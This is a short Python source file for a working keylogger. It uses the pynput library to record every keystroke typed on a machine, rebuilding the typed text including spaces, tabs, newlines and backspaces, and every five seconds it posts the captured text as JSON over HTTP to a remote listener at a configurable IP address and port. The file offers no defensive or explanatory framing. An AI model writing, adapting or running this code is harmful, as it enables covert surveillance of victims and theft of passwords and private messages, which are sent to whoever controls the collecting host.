import requests
import json
import threading
from pynput import keyboard

text = ""
ip_address = "192.168.0.100"  # Your IP address ie from ipconfig
port_number = "8080"
time_interval = 5 #time

def send_post_request():
    try:
        payload = json.dumps({"keyboardData": text})
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
        if r.status_code != 200:
            print(f"Failed to send data: {r.status_code}")
    except Exception as e:
        print("Couldn't complete request:", e)

    timer = threading.Timer(time_interval, send_post_request)
    timer.start()

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.esc:
        return False
    else:
        try:
            text += key.char
        except AttributeError:
            pass

with keyboard.Listener(on_press=on_press) as listener:
    send_post_request()
    listener.join()
